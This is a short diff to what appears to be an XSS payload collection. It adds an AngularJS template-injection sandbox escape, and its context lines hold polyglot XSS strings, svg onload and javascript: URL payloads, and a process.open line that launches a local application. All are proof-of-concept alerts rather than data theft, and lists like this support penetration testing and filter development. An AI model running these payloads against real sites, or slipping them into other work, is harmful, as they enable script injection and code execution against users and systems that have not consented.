@@ -211,3 +211,4 @@ Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>';location='javascrip
 eval(String.raw({raw:'aet(1)'},'l','r'))
 process.open("/Applications/Calculator.app/Contents/MacOS/Calculator");
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmouseover=1/+/[*/[]/+alert(1)//'>
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}}};alert(1)//');}}
